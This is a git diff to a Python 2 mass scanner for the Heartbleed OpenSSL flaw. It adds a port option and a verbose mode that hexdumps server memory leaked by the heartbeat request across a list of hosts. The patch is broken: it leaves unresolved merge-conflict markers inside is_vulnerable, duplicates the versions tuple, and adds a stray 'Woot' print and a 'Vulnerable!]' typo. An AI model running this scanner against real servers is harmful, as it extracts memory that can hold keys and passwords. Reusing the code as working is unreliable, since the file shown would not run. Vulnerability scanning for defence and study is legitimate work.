@@ -15,7 +15,18 @@ import select
 import re
 from optparse import OptionParser
 
-options = OptionParser(usage='%prog file [port]', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple hosts, takes a file as an argument')
+options = OptionParser(usage='%prog [options] file', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple hosts, takes a file as an argument')
+options.add_option('-p', '--port', type='int', default=443, dest='port', help='TCP port to test (default: 443)')
+options.add_option('-v', '--verbose', action="store_true", dest="verbose", help='Be verbose: hexdump server memory')
+
+versions = (['TLS 1.2','03 03'],
+            ['TLS 1.1','03 02'],
+            ['TLS 1.0','03 01'],
+            ['SSL 3.0','03 00'])
+
+timeout = 2  # tcp connection timeout
+
+buffy = 4096 # tcp recv buffer
 
 versions = (['SSL 3.0','03 00'],
             ['TLS 1.0','03 01'],
@@ -53,10 +64,13 @@ def get_hb(ver):
     return hb
 
 def hexdump(s):
+    print "Woot"
     for b in xrange(0, len(s), 16):
         lin = [c for c in s[b : b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
         pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
+        print '  %04x: %-48s %s' % (b, hxdat, pdat)
+    print
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -99,17 +113,20 @@ def hit_hb(s,hb):
             return False
 
         if typ == 24:
-            hexdump(pay)
+            if verbose:
+                hexdump(pay)
             if len(pay) > 3:
                 return True
             else:
                 return False
 
         if typ == 21:
-            hexdump(pay)
+            if verbose:
+                hexdump(pay)
             return False
 
 def is_vulnerable(target, port):
+<<<<<<< HEAD
 
     for version in versions:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -117,6 +134,15 @@ def is_vulnerable(target, port):
         print "[C:",
         sys.stdout.flush()
 
+=======
+
+    for version in versions:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        print "[C:",
+        sys.stdout.flush()
+
+>>>>>>> 83601eaa503af811041fe0c0d0df0dd8dc3f3de3
         try:
             s.connect((target, port))
             if port == 25: # smtp
@@ -166,6 +192,7 @@ def is_vulnerable(target, port):
 
 
 def main():
+    global verbose
     opts, args = options.parse_args()
     if len(args) < 1:
         options.print_help()
@@ -173,8 +200,7 @@ def main():
     else:
         inputFile = args[0]
 
-    defport = args[1] if len(args) > 1 else 443
-
+    verbose = opts.verbose
     counter_nossl = 0;
     counter_notvuln = 0;
     counter_vuln = 0;
@@ -191,7 +217,7 @@ def main():
         if overrideport:
             port = int(overrideport)
         else:
-            port = int(defport)
+            port = int(opts.port)
 
         print "%s:%s," % (target,port),
         sys.stdout.flush();
@@ -200,7 +226,7 @@ def main():
             print "No OpenSSL."
             counter_nossl += 1;
         elif result:
-            print "Vulnerable!"
+            print "Vulnerable!]"
             counter_vuln += 1;
         else:
             print "Safe."
